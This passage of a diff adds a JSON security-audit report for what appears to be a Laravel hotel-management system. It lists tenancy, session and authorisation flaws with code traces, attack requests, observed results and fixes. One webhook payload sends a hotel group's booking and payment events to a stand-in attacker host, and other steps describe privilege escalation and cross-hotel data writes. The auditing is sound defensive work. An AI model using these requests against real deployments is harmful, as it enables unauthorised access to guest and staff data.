+        "file": "app/Http/Controllers/ProfileController.php",
+        "line": 47,
+        "description": "password() updates the hash only; no Auth::logoutOtherDevices(), no tokens()->revoke"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "prior session/token theft"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Attacker who already holds a stolen session/token of the victim",
+      "payloads": [
+        "see instructions (session)"
+      ],
+      "instructions": [
+        "POST /profile/password",
+        "password() updates the hash only; no Auth::logoutOtherDevices(), no tokens()->revoke"
+      ],
+      "observed_result": "Attacker's session (120 min / remember-me) and 12 h API tokens keep working after the victim rotates the password"
+    },
+    "remediation": {
+      "strategy": "After a successful change: Auth::logoutOtherDevices($data['password']); $user->tokens()->update(['revoked'=>true]); for members delete other session rows for the account"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Attacker who already holds a stolen session/token of the victim; Credential rotation should end attacker access"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Attacker's session (120 min / remember-me) and 12 h API tokens keep working after the victim rotates the password"
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h2-auth"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "session:suspension-does-not-invalidate-web-sessions",
+    "title": "Suspending a user revokes API tokens but not live web sessions or remember-me cookies",
+    "description": "Suspended staff keep browsing and calling /api/v1 via the laravel_token cookie (re-issued on each web response) for up to the session lifetime, or indefinitely with remember-me, since no per-request status check exists",
+    "root_cause": "app/Modules/Tenancy/Http/UserController.php:81 - Only $user->tokens()->update(['revoked'=>true]); no session purge, no remember_token rotation",
+    "intended_behavior": "Suspension should end access immediately",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Tenancy/Http/UserController.php",
+        "line": 61,
+        "scope": "UserController::update",
+        "description": "PATCH /api/v1/users/{user} status=suspended (also set automatically by HR termination: app/Modules/HR/Application/HrService.php line 144)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Tenancy/Http/UserController.php",
+        "line": 81,
+        "scope": "UserController::update",
+        "description": "only $user->tokens()->update(['revoked'=>true]); no sessions purge, no remember_token rotation, no password invalidation"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Http/Controllers/Auth/AuthenticatedSessionController.php",
+        "line": 31,
+        "scope": "AuthenticatedSessionController::store",
+        "description": "Auth::guard('web')->validate($credentials) then login (line 45): users.status is never consulted, so a suspended user can even sign in again with their password"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Platform/Tenancy/ResolveTenant.php",
+        "line": 21,
+        "scope": "ResolveTenant::handle",
+        "description": "per-request tenant resolution reads the user but never its status; no middleware anywhere checks users.status (grep: only StaffDirectory/StaffController filter listings)"
+      },
+      {
+        "kind": "sink",
+        "file": "bootstrap/app.php",
+        "line": 33,
+        "scope": "withMiddleware web group",
+        "description": "CreateFreshApiToken re-issues the laravel_token API cookie on every web response, so the suspended user keeps full /api/v1 access via the session"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Admin/Application/LoginGuard.php",
+        "line": 41,
+        "description": "locked() only looks at locked_until (lockout), not status"
+      },
+      {
+        "file": "app/Modules/Admin/Http/TokenController.php",
+        "line": 23,
+        "description": "POST /api/v1/auth/token validates credentials with no status check either (file contains no reference to status)"
+      },
+      {
+        "file": "config/session.php",
+        "line": 21,
+        "description": "SESSION_DRIVER defaults to database, so per-user purge (sessions.user_id) is available but unused"
+      },
+      {
+        "file": "app/Modules/HR/Application/HrService.php",
+        "line": 144,
+        "description": "terminate() sets users.status='suspended' expecting that to end access"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "Target account was suspended/terminated; attacker knows the password or still holds a session/remember cookie"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Terminated employee whose HR record was closed (users.status='suspended')",
+      "payloads": [
+        "POST /login {email, password}",
+        "GET /dashboard with the existing session cookie",
+        "GET /api/v1/me with the laravel_token cookie"
+      ],
+      "instructions": [
+        "As admin PATCH /api/v1/users/{id} {\"status\":\"suspended\"} (or terminate the employee)",
+        "As the suspended user, POST /login with the still-valid password, or reuse the browser session",
+        "Call any staff API"
+      ],
+      "observed_result": "Login succeeds (302 to dashboard) and all permitted API calls return 200; only personal access tokens issued before suspension are refused"
+    },
+    "remediation": {
+      "strategy": "Add a status check in AuthenticatedSessionController::store, TokenController::store and DemoLoginController (refuse status==='suspended'), add a lightweight middleware on web+api groups that logs out / 401s when $request->user()->status === 'suspended', and on suspension delete sessions where user_id = $user->id and rotate remember_token."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Preconditions: A staff user who was just suspended but still has an open browser session / remember_token; Account deactivation boundary: suspended user keeps an authenticated staff session until it expires"
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Suspended staff keep browsing and calling /api/v1 via the laravel_token cookie (re-issued on each web response) for up to the session lifetime, or indefinitely with remember-me, since no per-request status check exists"
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h2-auth"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "tenancy:edge:child-row-parent-check-accepts-sister-hotel",
+    "title": "Edge push tenant check for child tables passes when the parent row belongs to another hotel of the same group",
+    "description": "Node of hotel A pushes {table:'reservation_nights', row_id:<night of hotel B reservation>, op:'upsert', data:{id, reservation_id:<B res>, amount:0}} -> accepted ('applied'), hotel B's night revenue rewritten; or op:'delete' on hotel B pos_check_lines / loyalty_cards (loyalty_transactions is append-only but insert of a fake earn row for a B membership is possible since loyalty_memberships is group-level)",
+    "root_cause": "app/Modules/Edge/Application/RowStore.php:28 - DB::table($table)->where('id',$id)->update/insert/delete with no tenant predicate",
+    "intended_behavior": "tenantViolation() comment: 'an edge cannot take over a row owned by another tenant'; edge context set to [$node->hotel_id]",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Edge/Http/EdgeSyncController.php",
+        "line": 13,
+        "scope": "EdgeSyncController::push",
+        "description": "POST /api/v1/edge/sync/push (public-routes.php line 8, throttle:api only) authenticated by node signature; changes[].table/row_id/op/data are node-chosen (raw input kept at line 31)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Edge/Application/CloudSync.php",
+        "line": 181,
+        "scope": "CloudSync::tenantViolation",
+        "description": "For tables without hotel_id/group_id columns the parent row is looked up via TablePolicy::PARENTS (line 182-183)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Edge/Application/CloudSync.php",
+        "line": 184,
+        "scope": "CloudSync::tenantViolation",
+        "description": "if (! $p || (int)($p['hotel_id'] ?? 0) !== $node->hotel_id && (int)($p['group_id'] ?? 0) !== $node->group_id) - && binds tighter than ||, so a parent in hotel B of the same group (group matches) is accepted"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Edge/Application/CloudSync.php",
+        "line": 143,
+        "scope": "CloudSync::apply",
+        "description": "op=delete -> rows->delete; op=upsert -> rows->upsert for 'operational' tables (line 149)"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Edge/Application/RowStore.php",
+        "line": 28,
+        "scope": "RowStore::upsert / delete (line 69)",
+        "description": "DB::table($table)->where('id',$id)->update/insert/delete with no tenant predicate"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Edge/Application/TablePolicy.php",
+        "line": 40,
+        "description": "'reservation_nights' => ['reservations','reservation_id'] and pos_check_lines, loyalty_cards etc. are child tables with no tenant columns (lines 33-43)"
+      },
+      {
+        "file": "app/Modules/Edge/Application/CloudSync.php",
+        "line": 173,
+        "description": "Comment: 'an edge cannot take over a row owned by another tenant' - the intended control; direct hotel_id rows are correctly rejected at line 175-177"
+      },
+      {
+        "file": "tests/Feature/Edge/EdgeSyncTest.php",
+        "line": 198,
+        "description": "test_tenant_isolation only forges rooms/hotels rows (tables with hotel_id); the PARENTS branch is untested"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "Attacker holds an active edge-node secret of any hotel in the group (compromised on-premise box or leaked secret)"
+      },
+      {
+        "kind": "data_state",
+        "description": "Target row is in a TablePolicy::PARENTS table whose parent belongs to another hotel of the same group; for upserts the changed_at must be newer than cloud changes (LWW, line 132-139)"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Operator of hotel A's edge node (or holder of its secret) in a two-hotel group",
+      "payloads": [
+        "{\"batch_key\":\"x\",\"from_cursor\":1,\"to_cursor\":2,\"changes\":[{\"seq\":1,\"table\":\"reservation_nights\",\"row_id\":<night id of hotel B reservation>,\"op\":\"upsert\",\"changed_at\":\"<future ISO>\",\"data\":{\"id\":<night id>,\"reservation_id\":<B res id>,\"amount\":0}}]}",
+        "same with \"op\":\"delete\" on a hotel-B pos_check_lines row"
+      ],
+      "instructions": [
+        "Sign the request with Signature::headers(nodeId, secret, 'POST', 'api/v1/edge/sync/push', body)",
+        "POST to /api/v1/edge/sync/push",
+        "Read the hotel B row"
+      ],
+      "observed_result": "Response reports 'applied' (no tenant_rejected conflict); hotel B's reservation_night amount is rewritten / pos_check_line deleted"
+    },
+    "remediation": {
+      "strategy": "Parenthesise and require a hotel match whenever the parent has a hotel_id column: if (! $p || (array_key_exists('hotel_id',$p) ? (int)$p['hotel_id'] !== $node->hotel_id : (int)($p['group_id'] ?? 0) !== $node->group_id)) return 'Parent row is not owned by this hotel.';"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Preconditions: Edge node of hotel A (signed edge token; a compromised on-premise box or stolen node secret); Hotel boundary within the group (edge node context is [hotel A] only)"
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Node of hotel A pushes {table:'reservation_nights', row_id:<night of hotel B reservation>, op:'upsert', data:{id, reservation_id:<B res>, amount:0}} -> accepted ('applied'), hotel B's night revenue rewritten; or op:'delete' on hotel B pos_check_lines / loyalty_cards (loyalty_transactions is append-only but insert of a fake earn row for a B membership is possible since loyalty_memberships is group-"
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h1-tenancy"
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "tenancy:edge:pull-replicates-group-users-with-secrets",
+    "title": "Edge pull sends every group-level row (hotel_id null) incl. users rows with password/pos_pin hashes and encrypted MFA secrets of all hotels' staff to each node",
+    "description": "Operator of hotel A's edge box can dump users of hotel B (emails, bcrypt hashes, recovery codes) and attempt offline cracking; not verified whether ChangeCapture records users at all (only capture of models with group_id)",
+    "claimed_root_cause": "app/Modules/Edge/Application/ChangeFeed.php:30 - RowStore::read returns the full raw row (no $hidden filtering) for each change",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Edge/Application/CloudSync.php",
+        "line": 89,
+        "scope": "entrypoint",
+        "description": "pull(): edge_changes where hotel_id = node.hotel_id OR (hotel_id null AND group_id = node.group_id)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Edge/Application/TablePolicy.php",
+        "line": 22,
+        "scope": "propagation",
+        "description": "'users' is a replicated master table; users has group_id only, so its changes are group-level"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Models/User.php",
+        "line": 10,
+        "scope": "propagation",
+        "description": "columns password, pos_pin (hashed), mfa_secret (encrypted with APP_KEY), mfa_recovery_codes"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Edge/Application/ChangeFeed.php",
+        "line": 30,
+        "scope": "sink",
+        "description": "RowStore::read returns the full raw row (no $hidden filtering) for each change"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Edge/Application/ChangeFeed.php",
+        "line": 30,
+        "description": "RowStore::read returns the full raw row (no $hidden filtering) for each change"
+      }
+    ],
+    "blockers": [
+      "ChangeCapture coverage of the users table was not established from source; whether user rows (password hashes, encrypted mfa secrets) are ever written into the change feed decides the finding."
+    ],
+    "validation_plan": {
+      "local": "Local: run the Edge pull test fixture on a scratch database after creating a user of another hotel and inspect the feed rows for the users table.",
+      "deployment": "Owner confirms the production and staging environment files and the edge proxy configuration."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "tenancy:guests:export-and-merge-ignore-allowed-hotels",
+    "title": "Guest data-protection export and merge read/re-point reservations and loyalty rows of every hotel in the group, ignoring the actor's allowed hotels",
+    "description": "Hotel-A receptionist with guests.manage exports a VIP guest and obtains their complete stay history and amounts at hotel B; merge lets them silently re-assign hotel B invoices/folios to another guest",
+    "root_cause": "app/Modules/Guests/Http/GuestController.php:145 - DB::table('reservations')->where('guest_id',$g->id)->get() and loyalty_memberships: raw query, no hotel_id / allowed-hotel filter, returns full rows of sister hotels (rates, dates, notes, totals)",
+    "intended_behavior": "GuestProfileController::scoped() limits raw guest reads to the actor's allowed hotels",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Guests/Http/GuestController.php",
+        "line": 139,
+        "scope": "entrypoint",
+        "description": "GET /api/v1/guests/{id}/export (authorize 'manage' only)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Guests/Http/GuestController.php",
+        "line": 112,
+        "scope": "propagation",
+        "description": "merge(): DB::table($table)->where('guest_id',$dup->id)->update(guest_id) across reservations/folios/invoices of all hotels - a hotel-A user can rewrite hotel B's folio/invoice ownership"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Guests/Http/GuestProfileController.php",
+        "line": 166,
+        "scope": "propagation",
+        "description": "contrast: history()/folios() apply scoped() with allowedHotelIds - the intended pattern"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Guests/Http/GuestController.php",
+        "line": 145,
+        "scope": "sink",
+        "description": "DB::table('reservations')->where('guest_id',$g->id)->get() and loyalty_memberships: raw query, no hotel_id / allowed-hotel filter, returns full rows of sister hotels (rates, dates, notes, totals)"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Guests/Http/GuestController.php",
+        "line": 145,
+        "description": "DB::table('reservations')->where('guest_id',$g->id)->get() and loyalty_memberships: raw query, no hotel_id / allowed-hotel filter, returns full rows of sister hotels (rates, dates, notes, totals)"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "actor has guests.manage"
+      },
+      {
+        "kind": "data_state",
+        "description": "actor all_hotels=false"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Staff user with guests.manage limited to hotel A",
+      "payloads": [
+        "see instructions (tenant-isolation)"
+      ],
+      "instructions": [
+        "GET /api/v1/guests/{id}/export (authorize 'manage' only)",
+        "DB::table('reservations')->where('guest_id',$g->id)->get() and loyalty_memberships: raw query, no hotel_id / allowed-hotel filter, returns full rows of sister hotels (rates, dates, notes, totals)"
+      ],
+      "observed_result": "Hotel-A receptionist with guests.manage exports a VIP guest and obtains their complete stay history and amounts at hotel B; merge lets them silently re-assign hotel B invoices/folios to another guest"
+    },
+    "remediation": {
+      "strategy": "Reuse the scoped() helper (group_id + whereIn hotel_id allowed) for export; in merge() either require all_hotels or restrict the re-pointing updates to allowed hotels"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Staff user with guests.manage limited to hotel A; Hotel boundary within group (allowedHotelIds)"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Hotel-A receptionist with guests.manage exports a VIP guest and obtains their complete stay history and amounts at hotel B; merge lets them silently re-assign hotel B invoices/folios to another guest"
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h1-tenancy"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "tenancy:idempotency:anonymous-scope-shared-across-clients",
+    "title": "Idempotency-Key replay cache for unauthenticated routes is keyed only by key|method|path, so any client can replay another client's stored response",
+    "description": "Mostly informational: a victim's response is replayable only with identical body; realistic abuse limited to replaying cancel/callback outcomes. Noted for completeness.",
+    "root_cause": "app/Platform/Http/Idempotency.php:37 - returns stored response_body (e.g. booking confirmation with manage_token, pay-link intent) when key and request_hash match",
+    "intended_behavior": "Idempotency keys are meant to be per client",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Platform/Http/Idempotency.php",
+        "line": 24,
+        "scope": "entrypoint",
+        "description": "$scope = ('anon')|method|path for every public-routes.php request (middleware ['api','idempotent'])"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Platform/Http/Idempotency.php",
+        "line": 29,
+        "scope": "propagation",
+        "description": "request_hash must match too, which makes exploitation need the identical body - practical only for low-entropy bodies (e.g. /payments/callbacks, /booking/{group}/reservations/cancel {confirmation, token})"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Platform/Http/Idempotency.php",
+        "line": 37,
+        "scope": "sink",
+        "description": "returns stored response_body (e.g. booking confirmation with manage_token, pay-link intent) when key and request_hash match"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Platform/Http/Idempotency.php",
+        "line": 37,
+        "description": "returns stored response_body (e.g. booking confirmation with manage_token, pay-link intent) when key and request_hash match"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "attacker knows key + exact body"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Anonymous client of public /api/v1 routes",
+      "payloads": [
+        "see instructions (idor)"
+      ],
+      "instructions": [
+        "$scope = ('anon')|method|path for every public-routes.php request (middleware ['api','idempotent'])",
+        "returns stored response_body (e.g. booking confirmation with manage_token, pay-link intent) when key and request_hash match"
+      ],
+      "observed_result": "Mostly informational: a victim's response is replayable only with identical body; realistic abuse limited to replaying cancel/callback outcomes. Noted for completeness."
+    },
+    "remediation": {
+      "strategy": "Include client IP (or skip caching) for anonymous requests; or require Idempotency-Key only on authenticated routes"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Preconditions: Anonymous client of public /api/v1 routes; Client-to-client (and potentially group-to-group since path includes group slug only for booking routes)"
+      },
+      "impact": {
+        "score": "informational",
+        "reason": "Mostly informational: a victim's response is replayable only with identical body; realistic abuse limited to replaying cancel/callback outcomes. Noted for completeness."
+      },
+      "overall_severity": "informational"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h1-tenancy"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "tenancy:memberportal:phone-suffix-match-links-other-guest",
+    "title": "Member sign-up links the new account to any guest whose phone ends with the same 9 digits",
+    "description": "Attacker registers +44xxx123456789 and is linked to a Cameroonian guest +237 123456789 (9 significant digits) -> sees and cancels that guest's bookings, downloads invoices",
+    "root_cause": "app/Modules/MemberPortal/Application/MemberAuthService.php:275 - matchGuest: whereRaw(\"length(digits) >= 9 and right(digits, 9) = ?\", [last 9 digits]) - different country code / prefix with same trailing 9 digits matches; then account->guest_id = that guest",
+    "intended_behavior": "OTP proves control of the contact; contact must identify exactly one guest",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "routes/web/member.php",
+        "line": 14,
+        "scope": "entrypoint",
+        "description": "POST /account/register then /account/register/verify (OTP to the attacker's own phone)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/MemberPortal/Application/MemberAuthService.php",
+        "line": 109,
+        "scope": "propagation",
+        "description": "verifySignup: $guest = matchGuest($contact); forceFill(['guest_id' => $guest->id, ...])"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/MemberPortal/Application/MemberBookings.php",
+        "line": 40,
+        "scope": "propagation",
+        "description": "all member reads are keyed on $a->guest_id -> full stay history, invoices PDFs, pay links, cancel"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/MemberPortal/Application/MemberAuthService.php",
+        "line": 275,
+        "scope": "sink",
+        "description": "matchGuest: whereRaw(\"length(digits) >= 9 and right(digits, 9) = ?\", [last 9 digits]) - different country code / prefix with same trailing 9 digits matches; then account->guest_id = that guest"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/MemberPortal/Application/MemberAuthService.php",
+        "line": 275,
+        "description": "matchGuest: whereRaw(\"length(digits) >= 9 and right(digits, 9) = ?\", [last 9 digits]) - different country code / prefix with same trailing 9 digits matches; then account->guest_id = that guest"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "a staff-created guest whose phone has the same last 9 digits exists in the group"
+      },
+      {
+        "kind": "data_state",
+        "description": "guest has no verified member account yet (profile_taken check)"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Anonymous person who controls a phone number",
+      "payloads": [
+        "see instructions (idor)"
+      ],
+      "instructions": [
+        "POST /account/register then /account/register/verify (OTP to the attacker's own phone)",
+        "matchGuest: whereRaw(\"length(digits) >= 9 and right(digits, 9) = ?\", [last 9 digits]) - different country code / prefix with same trailing 9 digits matches; then account->guest_id = that guest"
+      ],
+      "observed_result": "Attacker registers +44xxx123456789 and is linked to a Cameroonian guest +237 123456789 (9 significant digits) -> sees and cancels that guest's bookings, downloads invoices"
+    },
+    "remediation": {
+      "strategy": "Match on the full E.164-normalised number (or require country code equality); when several guests match, do not auto-link (create a new profile and let staff merge)"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Anonymous person who controls a phone number; Guest-to-guest boundary (member account gets guest_id of another person's profile and thus their bookings, invoices, points)"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Attacker registers +44xxx123456789 and is linked to a Cameroonian guest +237 123456789 (9 significant digits) -> sees and cancels that guest's bookings, downloads invoices"
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h1-tenancy"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "tenancy:users:hotel-scoped-admin-grants-all-hotels",
+    "title": "A hotel-scoped users.manage holder can grant all_hotels=true (to anyone, including themself) and so escape their own hotel allow-list",
+    "description": "Hotel-A manager PATCHes their own user (or a colleague) with {\"all_hotels\": true, \"roles\": [\"group-owner\"]} -> next request they read/write every hotel of the group (reservations, folios, payroll, accounting) and hold group-owner permissions",
+    "root_cause": "app/Modules/Tenancy/Http/UserController.php:148 - $user->update(collect($data)->only(['name','status','all_hotels'])) and syncRoles($data['roles']) with no check that the actor themself has all_hotels or holds the role being granted",
+    "intended_behavior": "Per-user hotel allow-list (users.hotels pivot / all_hotels) is the second tenancy dimension; a hotel manager should not be able to widen it beyond their own scope nor hand out higher roles",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Tenancy/routes.php",
+        "line": 16,
+        "scope": "routes",
+        "description": "PATCH /api/v1/users/{user} and POST /api/v1/users reachable with users.manage only"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Tenancy/Http/UserController.php",
+        "line": 63,
+        "scope": "UserController::update",
+        "description": "Only users.manage and same group are checked; the actor's own hotel scope is never compared"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Tenancy/Http/UserController.php",
+        "line": 74,
+        "scope": "UserController::update",
+        "description": "all_hotels and roles (any role, including group-owner) are written from the request"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Tenancy/Http/UserController.php",
+        "line": 50,
+        "description": "store() writes all_hotels straight from the request"
+      },
+      {
+        "file": "app/Modules/Tenancy/Http/UserController.php",
+        "line": 76,
+        "description": "syncRoles with any existing api role"
+      },
+      {
+        "file": "app/Models/User.php",
+        "line": 52,
+        "description": "allowedHotelIds() returns null (all hotels) when all_hotels is true, recomputed on every request"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "actor has users.manage (hotel manager role likely has it)"
+      },
+      {
+        "kind": "authorization_role",
+        "description": "actor is not all_hotels (otherwise nothing to gain except role escalation)"
+      },
+      {
+        "kind": "data_state",
+        "description": "update() does not exclude the actor's own user id"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Staff user with users.manage whose all_hotels=false (allowed to hotel A only)",
+      "payloads": [
+        "see instructions (authz)"
+      ],
+      "instructions": [
+        "PATCH /api/v1/users/{user} (update) and POST /api/v1/users (store, line 100); only checks users.manage and same group_id",
+        "$user->update(collect($data)->only(['name','status','all_hotels'])) and syncRoles($data['roles']) with no check that the actor themself has all_hotels or holds the role being granted"
+      ],
+      "observed_result": "Hotel-A manager PATCHes their own user (or a colleague) with {\"all_hotels\": true, \"roles\": [\"group-owner\"]} -> next request they read/write every hotel of the group (reservations, folios, payroll, accounting) and hold group-owner permissions"
+    },
+    "remediation": {
+      "strategy": "In store()/update(): abort_unless($request->user()->all_hotels, 403) when all_hotels is requested true; restrict hotel_ids to the actor's allowedHotelIds(); forbid assigning roles the actor does not hold (or require a group-level permission such as users.manage_group); forbid editing own account's scope/roles"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Preconditions: Staff user with users.manage whose all_hotels=false (allowed to hotel A only); Hotel boundary inside a group (allowedHotelIds), and role boundary (any role incl. group-owner assignable)"
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Hotel-A manager PATCHes their own user (or a colleague) with {\"all_hotels\": true, \"roles\": [\"group-owner\"]} -> next request they read/write every hotel of the group (reservations, folios, payroll, accounting) and hold group-owner permissions"
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent; hunter h1-tenancy"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "tenancy:webhooks:hotel-id-not-checked-against-allowed-hotels",
+    "title": "Webhook subscription accepts any hotel_id (or null = whole group) without checking the actor's allowed hotels",
+    "description": "Hotel-A-only integrator creates {url: attacker, event_types:['*'], hotel_id: <hotel B id>} or hotel_id omitted -> receives all domain events (bookings, folio, payments, HR) of hotel B / the whole group",
+    "root_cause": "app/Modules/Platform/Application/QueueWebhookDeliveries.php:21 - subscriptions matched by group_id and (hotel_id null OR hotel_id = event.hotel_id) -> deliveries of hotel B's events are queued to the attacker's URL",
+    "intended_behavior": "Per-user hotel allow-list; cross-group is already prevented by the group_id filter in QueueWebhookDeliveries",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Platform/Http/WebhookController.php",
+        "line": 21,
+        "scope": "WebhookController::store",
+        "description": "POST /api/v1/webhooks behind auth:api+tenant; guard is only can('integrations.manage') (line 23)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Platform/Http/WebhookController.php",
+        "line": 28,
+        "scope": "WebhookController::store",
+        "description": "'hotel_id' => ['nullable','integer'] - no exists rule, no check against $request->user()->allowedHotelIds(); null = every hotel of the group"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Platform/Http/WebhookController.php",
+        "line": 31,
+        "scope": "WebhookController::store",
+        "description": "WebhookSubscription::create($data + secret); model uses BelongsToGroup only (Domain/WebhookSubscription.php line 10), hotel_id stored verbatim"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Platform/Application/QueueWebhookDeliveries.php",
+        "line": 21,
+        "scope": "QueueWebhookDeliveries::forEvent",
+        "description": "subscriptions selected where group matches and (hotel_id IS NULL OR hotel_id = event.hotel_id)"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Platform/Application/QueueWebhookDeliveries.php",
+        "line": 36,
+        "scope": "QueueWebhookDeliveries::forEvent",
+        "description": "DeliverWebhook::dispatch($id) posts the event envelope of hotel B (or all hotels) to the attacker's URL"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Platform/Tenancy/ResolveTenant.php",
+        "line": 33,
+        "description": "The per-user hotel allow-list (allowedHotelIds) is enforced for X-Hotel-Id, showing hotel scoping is an intended control that the webhook body bypasses"
+      },
+      {
+        "file": "app/Modules/Platform/Domain/WebhookSubscription.php",
+        "line": 12,
+        "description": "$guarded = ['id','group_id'] - hotel_id is mass-assignable from the request"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "Actor holds integrations.manage"
+      },
+      {
+        "kind": "data_state",
+        "description": "Actor has all_hotels=false (hotel-limited); otherwise group-wide subscription is legitimate"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Hotel-A-only staff with integrations.manage wants hotel B's reservation/payment/HR events",
+      "payloads": [
+        "POST /api/v1/webhooks {\"url\":\"https://attacker.example/hook\",\"event_types\":[\"*\"],\"hotel_id\":<B id>}",
+        "POST /api/v1/webhooks {\"url\":\"https://attacker.example/hook\",\"event_types\":[\"*\"]}"
+      ],
+      "instructions": [
+        "Authenticate as the hotel-A user with X-Hotel-Id: A",
+        "Create the subscription with hotel_id of hotel B or omitted",
+        "Trigger any event in hotel B (e.g. a booking)",
+        "Observe webhook_deliveries rows and the POST at the attacker URL"
+      ],
+      "observed_result": "Subscription created (201); hotel B events are delivered to the attacker's endpoint although the user cannot send X-Hotel-Id: B"
+    },
+    "remediation": {
+      "strategy": "Validate hotel_id with Rule::exists('hotels','id')->where('group_id', $user->group_id); when $user->allowedHotelIds() !== null require hotel_id to be in that list and reject null (or default it to the active hotel)."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Staff user with integrations.manage limited to hotel A; Hotel boundary within the group (allowedHotelIds)"
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Hotel-A-only integrator creates {url: attacker, event_types:['*'], hotel_id: <hotel B id>} or hotel_id omitted -> receives all domain events (bookings, folio, payments, HR) of hotel B / the whole group"
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h1-tenancy"
+    }
